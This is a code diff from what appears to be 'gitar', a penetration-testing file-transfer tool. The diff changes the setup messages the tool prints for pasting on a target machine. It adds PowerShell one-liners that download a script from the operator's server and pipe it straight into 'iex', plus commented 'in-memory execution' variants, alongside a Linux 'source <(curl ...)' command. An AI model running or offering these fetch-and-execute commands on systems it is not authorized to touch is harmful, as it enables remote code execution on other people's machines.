@@ -12,6 +12,7 @@ import (
 
 	"github.com/ariary/gitar/pkg/config"
 	"github.com/ariary/go-utils/pkg/clipboard"
+	"github.com/ariary/go-utils/pkg/color"
 	"github.com/ariary/go-utils/pkg/host"
 )
 
@@ -115,9 +116,16 @@ func InitGitar(serverIp string, detectExternal bool, windows bool, bidirectional
 //SetUpMessages: set up message that will be output to help in the final set up of gitar on target
 func SetUpMessage(config *config.Config) {
 	setUpMsgLinux := "source <(curl -s " + config.Url + "/alias)"
-	setUpMsgWindows := "curl -s " + config.Url + "/aliaswin > ./alias && doskey /macrofile=alias && del alias"
 	setUpMsg := setUpMsgLinux
 	if config.Windows {
+		setUpMsgWindows := color.BlueForeground("Powershell:")
+		setUpMsgWindows += "\n(Invoke-WebRequest " + config.Url + "/aliaswinpsinvokeweb).Content | iex "
+		setUpMsgWindows += color.Dim("\nInvoke-WebRequest " + config.Url + "/aliaswinpsinvokeweb -OutFile ./alias.ps1 && . ./alias.ps1 && del ./alias.ps1")
+		// setUpMsgWindows += "\nInvoke-RestMethod " + config.Url + "/aliaswinpsinvokeres | iex " + color.Dim("(in-memory execution)")
+		// setUpMsgWindows += "\nInvoke-RestMethod " + config.Url + "/aliaswinpsinvokeres > ./alias.ps1 && . ./alias.ps1 && del ./alias.ps1 "
+		setUpMsgWindows += "\n"
+		setUpMsgWindows += color.YellowForeground("CMD.exe:")
+		setUpMsgWindows += "\nto do.."
 		setUpMsg = setUpMsgWindows
 	}
 
